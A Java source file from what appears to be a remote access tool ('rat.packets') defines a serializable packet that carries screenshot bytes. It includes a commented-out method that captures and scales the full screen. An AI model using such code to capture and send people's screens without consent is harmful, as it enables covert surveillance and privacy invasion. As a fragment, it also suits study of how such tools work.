package rat.packets;

import java.io.Serializable;

public class ScreenshotDataPacket implements IPacket, Serializable {

    private static final long serialVersionUID = -3249845755107449742L;

    private byte[] screenshot;

    private int frameWidth, frameHeight;

    public ScreenshotDataPacket(int frameWidth, int frameHeight, byte[] screenshot) {
        this.frameHeight = frameHeight;
        this.frameWidth = frameWidth;
        this.screenshot = screenshot;
    }

    public byte[] getScreenshot() {
        return screenshot;
    }

    @Override
    public void execute() {
//        final ByteArrayOutputStream out = new ByteArrayOutputStream();
//        BufferedImage image = captureScreen(out);
//        img = out.toByteArray();
//        out.reset();
    }

//    private BufferedImage captureScreen(ByteArrayOutputStream out) {
//        BufferedImage image = null;
//        out.reset();
//
//        Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
//
//        int bestHeight = (int) Math.min(frameHeight, screenSize.getHeight());
//        int bestWidth = (int) Math.min(frameWidth, screenSize.getWidth());
//
//        image = robot.createScreenCapture(screenSize);
//
//        Image scaledImage = image.getScaledInstance(bestWidth, bestHeight, Image.SCALE_SMOOTH);
//        BufferedImage bimage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null),
//                BufferedImage.TYPE_INT_RGB);
//
//        Graphics2D bGr = bimage.createGraphics();
//        bGr.drawImage(scaledImage, 0, 0, null);
//        bGr.dispose();
//        image = bimage;
//
//        try {
//            ImageIO.write(image, PICTURE_EXTENSION, out);
//        } catch (IOException e) {
//            e.printStackTrace();
//            System.exit(1);
//        }
//
//        return image;
//    }

    @Override
    public PacketType getPacketType() {
        return PacketType.SCREENSHOT_DATA;
    }
}